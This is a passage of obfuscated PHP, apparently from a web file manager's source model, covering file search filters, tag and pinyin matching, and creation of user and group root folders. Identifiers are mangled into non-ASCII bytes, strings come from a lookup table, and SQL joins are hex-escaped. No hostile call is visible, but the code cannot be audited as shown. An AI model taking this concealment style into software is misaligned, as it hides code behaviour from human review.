$ËïÈÅÂ¡[] = $û¥øÕÄõ[$Í§¾ßõ[472]]; $÷£åúŞ™[] = $û¥øÕÄõ[$Í§¾ßõ[405]]; } } if (!$÷£åúŞ™) { return; } $this->where(array($Í§¾ßõ[405] => array($Í§¾ßõ[7], $÷£åúŞ™)))->delete(); Model($Í§¾ßõ[475])->remove($ËïÈÅÂ¡); } public function userSpace() { $´èåÒ—ğ =& $_SERVER[¯µç›È¢]; $€ç˜Ü±– = $this->tablePrefix; $åÕ±¾½œ = array($´èåÒ—ğ[1657] => USER_ID); $±»ğŞ = "{$€ç˜Ü±–}\151\x6f\137\x66\151\x6c\145\x20\x66\151\x6c\145\x73\x20\x6f\x6e\x20\146\151\154\145\163\56\x66\151\x6c\x65\x49\x44\40\75\40\x68\151\x73\164\157\162\171\56\x66\151\x6c\145\111\104"; return $this->alias($´èåÒ—ğ[2078])->where($åÕ±¾½œ)->join($±»ğŞ, $´èåÒ—ğ[2079])->sum($´èåÒ—ğ[90]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¤ÈÈÍÏË) { $ä½À¯Ã =& $_SERVER[¯µç›È¢]; $”õ‹š±ú = KodIO::fileTypeList(); $°»ùÃ» = $”õ‹š±ú[$¤ÈÈÍÏË]; if (!$°»ùÃ») { return array(); } $•€ı‡à¡ = $°»ùÃ»[$ä½À¯Ã[181]]; $²æÕ‚ä® = $ä½À¯Ã[7]; if (!$°»ùÃ»[$ä½À¯Ã[181]]) { $çå£Üğ“ = array_to_keyvalue($”õ‹š±ú, $ä½À¯Ã[12], $ä½À¯Ã[181]); $•€ı‡à¡ = implode($ä½À¯Ã[50], $çå£Üğ“); $²æÕ‚ä® = $ä½À¯Ã[2081]; } $Ş…«…Û› = explode($ä½À¯Ã[50], trim($•€ı‡à¡, $ä½À¯Ã[50])); return array($²æÕ‚ä®, $Ş…«…Û›); } public function listPathType($â€¶×´) { $ø‡æ²œ =& $_SERVER[¯µç›È¢]; $º¨½¶ÜÉ = $this->fileTypeWhere($â€¶×´); if (!$º¨½¶ÜÉ) { return array(); } $éÌ¿¼šß = array($ø‡æ²œ[588] => SourceModel::TYPE_USER, $ø‡æ²œ[589] => USER_ID, $ø‡æ²œ[585] => 0, $ø‡æ²œ[586] => $º¨½¶ÜÉ); return $this->listSource($éÌ¿¼šß); } public function listSearch($¿—®ñ“Å, $×ùàØŒ‚ = 300) { $ßÙØüŸğ =& $_SERVER[¯µç›È¢]; if (isset($¿—®ñ“Å[$ßÙØüŸğ[1927]]) && $¿—®ñ“Å[$ßÙØüŸğ[1927]]) { $¿—®ñ“Å[$ßÙØüŸğ[1927]] = str_replace($ßÙØüŸğ[392], $ßÙØüŸğ[2082], trim($¿—®ñ“Å[$ßÙØüŸğ[1927]])); } $Ñ¤Õ–” = $this->_parseSearchWhere($¿—®ñ“Å); $Ø­ø²ò† = $Ñ¤Õ–”; if (!isset($Ñ¤Õ–”[$ßÙØüŸğ[436]])) { $Ñ¤Õ–”[$ßÙØüŸğ[436]] = 0; } $¦ëâ¡Ã = $ßÙØüŸğ[2083]; $Ş±·Úß = $¦ëâ¡Ã; $this->_listSearchBindPinyin($¿—®ñ“Å, $Ñ¤Õ–”, $¦ëâ¡Ã); $this->alias($ßÙØüŸğ[449])->_makeOrder(); $Ñ¤Õ–” = $this->parseWhereLike($Ñ¤Õ–”); $¦¸Ì×Ê« = $this->distinct(!0)->field($¦ëâ¡Ã)->where($Ñ¤Õ–”)->selectPage($×ùàØŒ‚); $this->_listSearchFileContent($¦¸Ì×Ê«, $¿—®ñ“Å, $Ş±·Úß, $Ø­ø²ò†); $this->_listSearchDesc($¦¸Ì×Ê«, $¿—®ñ“Å, $Ş±·Úß); $this->_listSearchTag($¦¸Ì×Ê«, $¿—®ñ“Å, $Ş±·Úß); $this->_listSearchGroupTag($¦¸Ì×Ê«, $¿—®ñ“Å, $Ş±·Úß); $this->_listDataApply($¦¸Ì×Ê«[$ßÙØüŸğ[377]]); $this->_listMake($¦¸Ì×Ê«); return $¦¸Ì×Ê«; } private function _listSearchFileContent(&$Ã‰ÊÆ¥ , $óÑá¢ÑŞ, $ÆöĞÄ“ì, $öİµíÈà) { $Íìºòù =& $_SERVER[¯µç›È¢]; if (!$óÑá¢ÑŞ[$Íìºòù[1927]] || $Ã‰ÊÆ¥ [$Íìºòù[374]][$Íìºòù[361]] > 1) { return; } if (!isset($öİµíÈà[$Íìºòù[32]]) || !is_array($óÑá¢ÑŞ[$Íìºòù[472]])) { return; } $öİµíÈà[$Íìºòù[472]] = array($Íìºòù[7], $óÑá¢ÑŞ[$Íìºòù[472]]); unset($öİµíÈà[$Íìºòù[32]]); unset($óÑá¢ÑŞ[$Íìºòù[472]]); $èƒÍíÒ® = $this->field($ÆöĞÄ“ì)->where($öİµíÈà)->limit($Íìºòù[2084])->select(); if (!$èƒÍíÒ® || count($èƒÍíÒ®) == 0) { return; } $Ã‰ÊÆ¥ [$Íìºòù[377]] = array_merge($èƒÍíÒ®, $Ã‰ÊÆ¥ [$Íìºòù[377]]); $Ã‰ÊÆ¥ [$Íìºòù[374]][$Íìºòù[375]] += count($èƒÍíÒ®); } private function _listSearchTag(&$Õ¸Ç²ìÂ, $™ÛÚ€ìÀ, $ã‡·Û¯Ü) { $ô‘Ä¹åÕ =& $_SERVER[¯µç›È¢]; if (!$™ÛÚ€ìÀ[$ô‘Ä¹åÕ[1927]] || $Õ¸Ç²ìÂ[$ô‘Ä¹åÕ[374]][$ô‘Ä¹åÕ[361]] > 1) { return; } $”á•™²Ã = Model($ô‘Ä¹åÕ[2085])->listData(); $Êª‚†ºÎ = array(); $»ºã‘Ö = $™ÛÚ€ìÀ[$ô‘Ä¹åÕ[1927]]; foreach ($”á•™²Ã as $†æ‹ÅÁ™) { $„Ñ©ü¯ò = $†æ‹ÅÁ™[$ô‘Ä¹åÕ[32]]; $ÓÚÌ”Êş = str_replace($ô‘Ä¹åÕ[53], $ô‘Ä¹åÕ[12], Pinyin::get($„Ñ©ü¯ò)); if (stripos($„Ñ©ü¯ò, $»ºã‘Ö) !== !1 || stripos($ÓÚÌ”Êş, $»ºã‘Ö) !== !1) { $Êª‚†ºÎ[] = $†æ‹ÅÁ™[$ô‘Ä¹åÕ[405]]; } } if (!$Êª‚†ºÎ) { return; } $’ »õË™ = array($ô‘Ä¹åÕ[432] => array($ô‘Ä¹åÕ[7], $Êª‚†ºÎ), $ô‘Ä¹åÕ[1666] => USER_ID); $ò§Ä•‘Ê = Model($ô‘Ä¹åÕ[433])->field($ô‘Ä¹åÕ[88])->where($’ »õË™)->select(); $ò§Ä•‘Ê = array_to_keyvalue($ò§Ä•‘Ê, $ô‘Ä¹åÕ[12], $ô‘Ä¹åÕ[88]); $å¾œÏŒÎ = array_unique($ò§Ä•‘Ê); $this->_listSearchMerge($Õ¸Ç²ìÂ, $™ÛÚ€ìÀ, $ã‡·Û¯Ü, $å¾œÏŒÎ); } private function _listSearchDesc(&$ó™Ããì, $¬´®¾È’, $ÌÊí­Î) { $—ÍÔáç =& $_SERVER[¯µç›È¢]; if (!$¬´®¾È’[$—ÍÔáç[1927]] || $ó™Ããì[$—ÍÔáç[374]][$—ÍÔáç[361]] > 1) { return; } $ÏÁˆºİ– = $this->listSearchChildren($¬´®¾È’[$—ÍÔáç[503]]); $ÏÁˆºİ– = array_unique($ÏÁˆºİ–); if (!$ÏÁˆºİ–) { return; } $çÌÇÑ = array($—ÍÔáç[408] => array($—ÍÔáç[7], $ÏÁˆºİ–), $—ÍÔáç[105] => $—ÍÔáç[456], $—ÍÔáç[382] => array($—ÍÔáç[391], $—ÍÔáç[1929] . $¬´®¾È’[$—ÍÔáç[1927]] . $—ÍÔáç[1929])); $È¤ã‹ğ“ = Model($—ÍÔáç[571])->field($—ÍÔáç[408])->where($çÌÇÑ)->select(); $‘‡ ôù = array_to_keyvalue($È¤ã‹ğ“, $—ÍÔáç[12], $—ÍÔáç[408]); $this->_listSearchMerge($ó™Ããì, $¬´®¾È’, $ÌÊí­Î, $‘‡ ôù); } private function _listSearchGroupTag(&$Ê«ëªƒ…, $šçãĞµ¥, $šŠì‚ÖŠ) { $Ãçõ¼Ì =& $_SERVER[¯µç›È¢]; if (!$šçãĞµ¥[$Ãçõ¼Ì[1927]] || $Ê«ëªƒ…[$Ãçõ¼Ì[374]][$Ãçõ¼Ì[361]] > 1 || !$šçãĞµ¥[$Ãçõ¼Ì[503]]) { return; } $ªº¨­ÄŞ = $this->sourceInfo($šçãĞµ¥[$Ãçõ¼Ì[503]]); if (!$ªº¨­ÄŞ || $ªº¨­ÄŞ[$Ãçõ¼Ì[417]] != SourceModel::TYPE_GROUP) { return; } $£ì†ßè£ = $ªº¨­ÄŞ[$Ãçõ¼Ì[510]]; $š€ÛÌ¬± = Model($Ãçõ¼Ì[2086])->get($£ì†ßè£); $‰‹‹·· = array(); $ªƒ¯İıé = $šçãĞµ¥[$Ãçõ¼Ì[1927]]; foreach ($š€ÛÌ¬±[$Ãçõ¼Ì[377]] as $‹şØá½š) { $‘¾À—À = $‹şØá½š[$Ãçõ¼Ì[32]]; $È¦¾¬Üå = str_replace($Ãçõ¼Ì[53], $Ãçõ¼Ì[12], Pinyin::get($‘¾À—À)); if (stripos($‘¾À—À, $ªƒ¯İıé) !== !1 || stripos($È¦¾¬Üå, $ªƒ¯İıé) !== !1) { $‰‹‹··[] = $‹şØá½š[$Ãçõ¼Ì[405]]; } } if (!$‰‹‹··) { return; } $ÜüåİØ = array($Ãçõ¼Ì[432] => array($Ãçõ¼Ì[7], $‰‹‹··), $Ãçõ¼Ì[1666] => 0, $Ãçõ¼Ì[33] => $Ãçõ¼Ì[1949] . $£ì†ßè£); $¿‰’ª¿ş = Model($Ãçõ¼Ì[433])->field($Ãçõ¼Ì[88])->where($ÜüåİØ)->select(); $¿‰’ª¿ş = array_to_keyvalue($¿‰’ª¿ş, $Ãçõ¼Ì[12], $Ãçõ¼Ì[88]); $ñïå­¯´ = array_unique($¿‰’ª¿ş); $this->_listSearchMerge($Ê«ëªƒ…, $šçãĞµ¥, $šŠì‚ÖŠ, $ñïå­¯´); } private function _listSearchMerge(&$ïáÀÛ÷¼, $¡»ƒé¹Â, $¬ª»¼ôÃ, $Ï›ÎœÛÀ) { $¾ÍĞ‘úª =& $_SERVER[¯µç›È¢]; if (!$Ï›ÎœÛÀ) { return; } $·Ù²šóÅ = array_to_keyvalue($ïáÀÛ÷¼[$¾ÍĞ‘úª[377]], $¾ÍĞ‘úª[12], $¾ÍĞ‘úª[408]); $”¡©³é„ = array_diff($Ï›ÎœÛÀ, $·Ù²šóÅ); if (!$”¡©³é„) { return; } $·„°† = array($¾ÍĞ‘úª[408] => array($¾ÍĞ‘úª[7], $”¡©³é„)); $±•ø‹Õ„ = $this->field($¬ª»¼ôÃ)->where($·„°†)->select(); if (!$±•ø‹Õ„) { return; } $¶âñ²•÷ = array(); foreach ($±•ø‹Õ„ as $°¬¯ĞÍè) { if ($this->_listSearchFilter($°¬¯ĞÍè, $¡»ƒé¹Â)) { $¶âñ²•÷[] = $°¬¯ĞÍè; } } $ïáÀÛ÷¼[$¾ÍĞ‘úª[377]] = array_merge($¶âñ²•÷, $ïáÀÛ÷¼[$¾ÍĞ‘úª[377]]); $ïáÀÛ÷¼[$¾ÍĞ‘úª[374]][$¾ÍĞ‘úª[375]] += count($¶âñ²•÷); } private function _listSearchFilter($ŸÒ»áêŸ, $ÑâùæöÉ) { $ÑÇáôäõ =& $_SERVER[¯µç›È¢]; $ß‚ØŞ¹Û = $ŸÒ»áêŸ[$ÑÇáôäõ[416]] == $ÑÇáôäõ[99]; if (!strstr($ŸÒ»áêŸ[$ÑÇáôäõ[526]], $ÑÇáôäõ[50] . $ÑâùæöÉ[$ÑÇáôäõ[503]] . $ÑÇáôäõ[50])) { return !1; } if (isset($ÑâùæöÉ[$ÑÇáôäõ[418]]) && $ÑâùæöÉ[$ÑÇáôäõ[418]] != $ÑÇáôäõ[1888]) { if ($ÑâùæöÉ[$ÑÇáôäõ[418]] == $ÑÇáôäõ[89] && !$ß‚ØŞ¹Û) { return !1; } if ($ÑâùæöÉ[$ÑÇáôäõ[418]] != $ÑÇáôäõ[89] && $ß‚ØŞ¹Û) { return !1; } if (!strstr($ŸÒ»áêŸ[$ÑÇáôäõ[181]], $ÑÇáôäõ[50] . $ÑâùæöÉ[$ÑÇáôäõ[418]] . $ÑÇáôäõ[50])) { return !1; } } if (isset($ÑâùæöÉ[$ÑÇáôäõ[2087]]) && $ÑâùæöÉ[$ÑÇáôäõ[2087]] < $ŸÒ»áêŸ[$ÑÇáôäõ[90]]) { return !1; } if (isset($ÑâùæöÉ[$ÑÇáôäõ[2088]]) && $ÑâùæöÉ[$ÑÇáôäõ[2088]] > $ŸÒ»áêŸ[$ÑÇáôäõ[90]]) { return !1; } if (isset($ÑâùæöÉ[$ÑÇáôäõ[602]]) && $ÑâùæöÉ[$ÑÇáôäõ[602]] != $ŸÒ»áêŸ[$ÑÇáôäõ[459]]) { return !1; } return !0; } public function listSearchChildren($Õµµ”õ©, $¿‘èŠî§ = 5000) { $Ê©¤êíõ =& $_SERVER[¯µç›È¢]; $¤·¬ä…² = array(); $ Ë°ÉÇ = $this->sourceInfo($Õµµ”õ©); $ƒ†­Ò¯˜ = array($Ê©¤êíõ[526] => array($Ê©¤êíõ[391], $ Ë°ÉÇ[$Ê©¤êíõ[526]] . $ Ë°ÉÇ[$Ê©¤êíõ[408]] . $Ê©¤êíõ[553])); $‘˜ìŠ‚Ö = $this->field($Ê©¤êíõ[90])->where($ƒ†­Ò¯˜)->limit($¿‘èŠî§ + 1)->select(); $‘ş££é = is_array($‘˜ìŠ‚Ö) ? count($‘˜ìŠ‚Ö) : 0; if ($‘ş££é > $¿‘èŠî§) { return $this->_listSearchChildrenNear($Õµµ”õ©, $¿‘èŠî§); } $ëæ¶ù¥Õ = $this->field($Ê©¤êíõ[408])->where($ƒ†­Ò¯˜)->select(); $¤·¬ä…² = array_to_keyvalue($ëæ¶ù¥Õ, $Ê©¤êíõ[12], $Ê©¤êíõ[408]); return $¤·¬ä…²; } private function _listSearchChildrenNear($à“ƒ‰æ‚, $¦óÛùØ) { $ÏÄ’‚— =& $_SERVER[¯µç›È¢]; $óóÕ™Ô = array(); $÷¯ó¬î = array($ÏÄ’‚—[503] => $à“ƒ‰æ‚); $»¯ª¯²Ş = $this->field($ÏÄ’‚—[2089])->where($÷¯ó¬î)->select(); $¦–ãÀĞ˜ = array_to_keyvalue(array_filter_by_field($»¯ª¯²Ş, $ÏÄ’‚—[416], $ÏÄ’‚—[99]), $ÏÄ’‚—[12], $ÏÄ’‚—[408]); $óóÕ™Ô = array_merge($óóÕ™Ô, array_to_keyvalue($»¯ª¯²Ş, $ÏÄ’‚—[12], $ÏÄ’‚—[408])); if (!$¦–ãÀĞ˜) { return $óóÕ™Ô; } $÷¯ó¬î = array($ÏÄ’‚—[503] => array($ÏÄ’‚—[7], $¦–ãÀĞ˜)); $»¯ª¯²Ş = $this->field($ÏÄ’‚—[2089])->where($÷¯ó¬î)->limit($¦óÛùØ)->select(); $óóÕ™Ô = array_merge($óóÕ™Ô, array_to_keyvalue($»¯ª¯²Ş, $ÏÄ’‚—[12], $ÏÄ’‚—[408])); $óóÕ™Ô = array_slice($óóÕ™Ô, 0, $¦óÛùØ); return $óóÕ™Ô; } private function _listSearchBindPinyin($²Ù®’ä», &$©–³à…Ã, &$ğèÕĞóé) { $ ´êˆ»Û =& $_SERVER[¯µç›È¢]; if (!isset($²Ù®’ä»[$ ´êˆ»Û[1927]]) || !$²Ù®’ä»[$ ´êˆ»Û[1927]]) { return; } if (!Input::check($²Ù®’ä»[$ ´êˆ»Û[1927]], $ ´êˆ»Û[326]) || strlen($²Ù®’ä»[$ ´êˆ»Û[1927]]) < 2) { return; } $‹„ƒÔÏ¹ = "\x4c\105\106\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\151\157\x5f\163\157\165\x72\143\145\x5f\x6d\x65\164\141\x20\x6d\x65\x74\141\40\157\x6e\x20\x73\157\165\x72\143\x65\x2e\x73\x6f\165\x72\x63\145\111\104\x20\x3d\x20\x6d\x65\x74\141\x2e\x73\x6f\165\162\143\145\111\x44"; $÷¤Ñ’•ã = array(); $ğèÕĞóé = str_replace(array($ ´êˆ»Û[66], $ ´êˆ»Û[53], $ ´êˆ»Û[2090]), $ ´êˆ»Û[12], $ğèÕĞóé); $ğèÕĞóé = $ ´êˆ»Û[441] . str_replace($ ´êˆ»Û[50], $ ´êˆ»Û[442], $ğèÕĞóé); $Ñ¤…¢ó = $©–³à…Ã[$ ´êˆ»Û[32]]; unset($©–³à…Ã[$ ´êˆ»Û[32]]); foreach ($©–³à…Ã as $ëÉÎ°¢ => $¤ß•ÅĞï) { $÷¤Ñ’•ã[$ ´êˆ»Û[441] . $ëÉÎ°¢] = $¤ß•ÅĞï; } foreach ($Ñ¤…¢ó as $šÂ•öŒÌ) { $÷¤Ñ’•ã[] = array($ ´êˆ»Û[446] => $šÂ•öŒÌ, $ ´êˆ»Û[1012] => $ ´êˆ»Û[1931], array($ ´êˆ»Û[2091] => $šÂ•öŒÌ, $ ´êˆ»Û[2092] => array($ ´êˆ»Û[7], array($ ´êˆ»Û[469], $ ´êˆ»Û[468])))); } $this->join($‹„ƒÔÏ¹); $©–³à…Ã = $÷¤Ñ’•ã; } private function _parseSearchWhere($×™èøö¹) { $‡‰¯È±› =& $_SERVER[¯µç›È¢]; $ÉñŒıË¯ = array(); if (isset($×™èøö¹[$‡‰¯È±›[778]]) && $×™èøö¹[$‡‰¯È±›[778]]) { $ÉñŒıË¯[$‡‰¯È±›[96]] = array($‡‰¯È±›[2093], $×™èøö¹[$‡‰¯È±›[778]]); } if (isset($×™èøö¹[$‡‰¯È±›[501]]) && $×™èøö¹[$‡‰¯È±›[501]]) { $œƒ¨èİµ = array($‡‰¯È±›[2094], $×™èøö¹[$‡‰¯È±›[501]]); if ($ÉñŒıË¯[$‡‰¯È±›[96]]) { $ÉñŒıË¯[$‡‰¯È±›[96]] = array($ÉñŒıË¯[$‡‰¯È±›[96]], $œƒ¨èİµ, $‡‰¯È±›[2095]); } else { $ÉñŒıË¯[$‡‰¯È±›[96]] = $œƒ¨èİµ; } } if (isset($×™èøö¹[$‡‰¯È±›[2087]]) && $×™èøö¹[$‡‰¯È±›[2087]] > 0) { $ÉñŒıË¯[$‡‰¯È±›[90]] = array($‡‰¯È±›[2093], $×™èøö¹[$‡‰¯È±›[2087]]); } if (isset($×™èøö¹[$‡‰¯È±›[2088]]) && $×™èøö¹[$‡‰¯È±›[2088]]) { $œƒ¨èİµ = array($‡‰¯È±›[2094], $×™èøö¹[$‡‰¯È±›[2088]]); if ($ÉñŒıË¯[$‡‰¯È±›[90]]) { $ÉñŒıË¯[$‡‰¯È±›[90]] = array($ÉñŒıË¯[$‡‰¯È±›[90]], $œƒ¨èİµ, $‡‰¯È±›[2095]); } else { $ÉñŒıË¯[$‡‰¯È±›[90]] = $œƒ¨èİµ; } } if (isset($×™èøö¹[$‡‰¯È±›[602]]) && $×™èøö¹[$‡‰¯È±›[602]]) { $ÉñŒıË¯[] = array($‡‰¯È±›[459] => $×™èøö¹[$‡‰¯È±›[602]], $‡‰¯È±›[457] => $×™èøö¹[$‡‰¯È±›[602]], $‡‰¯È±›[1012] => $‡‰¯È±›[1931]); } if (isset($×™èøö¹[$‡‰¯È±›[418]]) && $×™èøö¹[$‡‰¯È±›[418]]) { $éıèÕêı = $×™èøö¹[$‡‰¯È±›[418]]; if ($éıèÕêı == $‡‰¯È±›[89]) { $ÉñŒıË¯[$‡‰¯È±›[416]] = 1; } else { if ($éıèÕêı == $‡‰¯È±›[2096]) { $ÉñŒıË¯[$‡‰¯È±›[416]] = 0; } else { if ($éıèÕêı) { $éıèÕêı = is_array($éıèÕêı) ? $éıèÕêı : explode($‡‰¯È±›[50], $éıèÕêı); $ÉñŒıË¯[$‡‰¯È±›[418]] = array($‡‰¯È±›[424], $éıèÕêı); $ÉñŒıË¯[$‡‰¯È±›[416]] = 0; } } } } $this->_parseSearchParent($×™èøö¹, $ÉñŒıË¯); if (isset($×™èøö¹[$‡‰¯È±›[1927]]) && trim($×™èøö¹[$‡‰¯È±›[1927]])) { $‘Éâœ  = trim($×™èøö¹[$‡‰¯È±›[1927]]); $Ëø™ú â = explode($‡‰¯È±›[53], $‘Éâœ ); if (strlen($‘Éâœ ) > 2 && (substr($‘Éâœ , 0, 1) == $‡‰¯È±›[129] && substr($‘Éâœ , -1) == $‡‰¯È±›[129]) || substr($‘Éâœ , 0, 1) == $‡‰¯È±›[58] && substr($‘Éâœ , -1) == $‡‰¯È±›[58]) { $‘Éâœ  = substr($‘Éâœ , 1, -1); $Ëø™ú â = array($‘Éâœ ); } $ÉñŒıË¯[$‡‰¯È±›[32]] = array(array($‡‰¯È±›[552], $‡‰¯È±›[1929] . $‘Éâœ  . $‡‰¯È±›[1929])); if (count($Ëø™ú â) > 1) { $ÉñŒıË¯[$‡‰¯È±›[32]] = array(); foreach ($Ëø™ú â as $¯çñªåì) { if (!trim($¯çñªåì)) { continue; } $ÉñŒıË¯[$‡‰¯È±›[32]][] = array($‡‰¯È±›[552], $‡‰¯È±›[1929] . trim($¯çñªåì) . $‡‰¯È±›[1929]); } } } return $ÉñŒıË¯; } private function _parseSearchParent($Õ£ò™³İ, &$ÚÎƒ‘Îú) { $ÇˆÚŸ— =& $_SERVER[¯µç›È¢]; if (!isset($Õ£ò™³İ[$ÇˆÚŸ—[503]]) || !$Õ£ò™³İ[$ÇˆÚŸ—[503]]) { return; } $û¸º÷šˆ = $this->pathInfo($Õ£ò™³İ[$ÇˆÚŸ—[503]]); $¢ÁãéÎ = $û¸º÷šˆ[$ÇˆÚŸ—[503]] . $ÇˆÚŸ—[12] === $ÇˆÚŸ—[204]; $Âù²ä‡ = $û¸º÷šˆ[$ÇˆÚŸ—[417]] == $ÇˆÚŸ—[520]; if ($û¸º÷šˆ[$ÇˆÚŸ—[537]] == $ÇˆÚŸ—[538]) { $ÂŞ‡„Ö’ = $this->sourceInfo($Õ£ò™³İ[$ÇˆÚŸ—[503]]); $û¸º÷šˆ[$ÇˆÚŸ—[526]] = $ÂŞ‡„Ö’[$ÇˆÚŸ—[526]]; } $ÚÎƒ‘Îú[$ÇˆÚŸ—[592]] = array($ÇˆÚŸ—[552], $û¸º÷šˆ[$ÇˆÚŸ—[526]] . $Õ£ò™³İ[$ÇˆÚŸ—[503]] . $ÇˆÚŸ—[553]); $¨ĞÑ¤şÂ = isset($Õ£ò™³İ[$ÇˆÚŸ—[1793]]) && in_array($ÇˆÚŸ—[520], $Õ£ò™³İ[$ÇˆÚŸ—[1793]]); if (!$¨ĞÑ¤şÂ || !$Âù²ä‡ || !$¢ÁãéÎ || !$û¸º÷šˆ[$ÇˆÚŸ—[419]]) { return; } if (!AuthModel::authCheckRoot($û¸º÷šˆ[$ÇˆÚŸ—[419]][$ÇˆÚŸ—[420]])) { return; } $»É²êÉË = $û¸º÷šˆ[$ÇˆÚŸ—[510]] . $ÇˆÚŸ—[12]; if ($»É²êÉË == $ÇˆÚŸ—[99]) { unset($ÚÎƒ‘Îú[$ÇˆÚŸ—[592]]); $ÚÎƒ‘Îú[$ÇˆÚŸ—[417]] = self::TYPE_GROUP; return; } $óĞÆâÛ = Model($ÇˆÚŸ—[527])->groupChildrenAll($»É²êÉË); $©ñ¿ ¿ò = count($óĞÆâÛ); if ($©ñ¿ ¿ò <= 1) { return; } $ÏÅÕ¨… = array($ÇˆÚŸ—[503] => 0, $ÇˆÚŸ—[417] => self::TYPE_GROUP, $ÇˆÚŸ—[510] => array($ÇˆÚŸ—[7], $óĞÆâÛ)); $õğÆ”ìó = $this->field($ÇˆÚŸ—[2097])->where($ÏÅÕ¨…)->limit($©ñ¿ ¿ò)->select(); $ÚÎƒ‘Îú[$ÇˆÚŸ—[592]] = array(); foreach ($õğÆ”ìó as $ÈÆªÓÙ¾) { $ÚÎƒ‘Îú[$ÇˆÚŸ—[592]][] = array($ÇˆÚŸ—[552], $ÇˆÚŸ—[536] . $ÈÆªÓÙ¾[$ÇˆÚŸ—[408]] . $ÇˆÚŸ—[553]); } $ÚÎƒ‘Îú[$ÇˆÚŸ—[592]][] = $ÇˆÚŸ—[1931]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÚÖâ¹€—) { $½Áâş¯ =& $_SERVER[¯µç›È¢]; $îè‰Ê“ = Model($½Áâş¯[518])->where(array($½Áâş¯[1657] => $ÚÖâ¹€—))->find(); $›ªù•› = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÚÖâ¹€—, $îè‰Ê“[$½Áâş¯[32]]); $this->userDesktopAdd($›ªù•›); return $›ªù•›; } public function userDesktopAdd($º»Ø…) { $ÇØå„¾Ã =& $_SERVER[¯µç›È¢]; $ıç±”Ë = LNG($ÇØå„¾Ã[2098]); $ÇÕ°îèµ = $this->mkdir($º»Ø…, $ıç±”Ë); $this->metaSet($ÇÕ°îèµ, $ÇØå„¾Ã[2099], $ÇØå„¾Ã[99]); $this->metaSet($º»Ø…, $ÇØå„¾Ã[2100], $ÇÕ°îèµ); } public function groupRootAdd($€á½Å€¥) { $„Ö¨Òàá =& $_SERVER[¯µç›È¢]; $Ñ¢³î© = Model($„Ö¨Òàá[527])->where(array($„Ö¨Òàá[1921] => $€á½Å€¥))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $€á½Å€¥, $Ñ¢³î©[$„Ö¨Òàá[32]]); } public function systemRootPathAdd($İÛÃá–õ) { if ($İÛÃá–õ != $_SERVER[¯µç›È¢][545]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $İÛÃá–õ); } public function userRootRemove($Û»÷Ÿ—™) { $†‹Ø¶Š = $this->sourceRoot(SourceModel::TYPE_USER, $Û»÷Ÿ—™); if (!$†‹Ø¶Š) { return; } $this->remove($†‹Ø¶Š, !1); } public function groupRootRemove($‚ÎîÓÃí) { $ŒÏûÀä“ = $this->sourceRoot(SourceModel::TYPE_GROUP, $‚ÎîÓÃí); if (!$ŒÏûÀä“) { return; } $this->remove($ŒÏûÀä“, !1); } private function _mkdirRoot($û¿¥¿Œ, $´†ß—é, $×Ë©íì¾) { $«ßÕ´ÏŸ =& $_SERVER[¯µç›È¢]; $¾®×ª÷ = array($«ßÕ´ÏŸ[407] => 0, $«ßÕ´ÏŸ[588] => $û¿¥¿Œ, $«ßÕ´ÏŸ[589] => $´†ß—é, $«ßÕ´ÏŸ[585] => 1, $«ßÕ´ÏŸ[590] => USER_ID, $«ßÕ´ÏŸ[591] => USER_ID, $«ßÕ´ÏŸ[586] => $«ßÕ´ÏŸ[12], $«ßÕ´ÏŸ[592] => $«ßÕ´ÏŸ[536], $«ßÕ´ÏŸ[435] => 0, $«ßÕ´ÏŸ[587] => 0, $«ßÕ´ÏŸ[473] => 0, $«ßÕ´ÏŸ[593] => $«ßÕ´ÏŸ[12]); if ($İÍšı = $this->where($¾®×ª÷)->find()) { return $İÍšı[$«ßÕ´ÏŸ[408]]; } $•ÖØµ³ = "\115\x6f\144\x65\154\123\x6f\165\162\x63\x65\56\155\x6b\144\151\x72\x52\157\157\164\56{$û¿¥¿Œ}\56{$´†ß—é}\56" . $×Ë©íì¾; CacheLock::lock($•ÖØµ³); $¾®×ª÷[$«ßÕ´ÏŸ[32]] = $×Ë©íì¾; $‚œŸˆšÕ = $this->add($¾®×ª÷); $¶¡›Ñ£ø = array($«ßÕ´ÏŸ[594] => short_id($‚œŸˆšÕ)); $this->where(array($«ßÕ´ÏŸ[423] => $‚œŸˆšÕ))->save($¶¡›Ñ£ø); CacheLock::unlock($•ÖØµ³); return $‚œŸˆšÕ; } private function sourceRoot($¶ÒÀºÓ™, $Íğà½Ãà, $¾­ËÌƒ = false) { $á’˜ªÕ· =& $_SERVER[¯µç›È¢]; $÷¬ğìÔø = array($á’˜ªÕ·[407] => 0, $á’˜ªÕ·[588] => $¶ÒÀºÓ™, $á’˜ªÕ·[589] => $Íğà½Ãà); if ($ß éÒŠ = $this->where($÷¬ğìÔø)->find()) { return $¾­ËÌƒ ? $ß éÒŠ : $ß éÒŠ[$á’˜ªÕ·[408]]; } return !1; } public function sourceRootGroup($Ó½ïî‡Ê) { $ÏÔ¨Èè =& $_SERVER[¯µç›È¢]; if (is_string($Ó½ïî‡Ê)) { $Ó½ïî‡Ê = array($Ó½ïî‡Ê); } $““¤Î‹ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ó½ïî‡Ê, $ÏÔ¨Èè[195]); $‰û¢ı€µ = array($ÏÔ¨Èè[377] => $““¤Î‹, $ÏÔ¨Èè[374] => array($ÏÔ¨Èè[776] => count($Ó½ïî‡Ê))); $this->_listDataApply($‰û¢ı€µ[$ÏÔ¨Èè[377]]); $this->_listMake($‰û¢ı€µ); return array_to_keyvalue($‰û¢ı€µ[$ÏÔ¨Èè[87]], $ÏÔ¨Èè[510]); } public function mkfile($ëóåâÍÃ, $œ²ßÉö, $–öÔ°ç = '', $ñÁàíş = REPEAT_RENAME) { $àºá—Ó =& $_SERVER[¯µç›È¢]; $×£˜‘çÛ = Model($àºá—Ó[611])->addFileByContent($–öÔ°ç, $œ²ßÉö); return $this->_createFileCall($ëóåâÍÃ, $œ²ßÉö, $×£˜‘çÛ, $ñÁàíş, $àºá—Ó[1348]); } public function addFile($ŞÎèœ«ı, $ÓÁ˜Ç†¶, $Ìâ¡ñÊ«, $Ïñªø‘˜ = false, $¼ ŒÍº  = REPEAT_RENAME) { $×Ï½¨ãÑ = 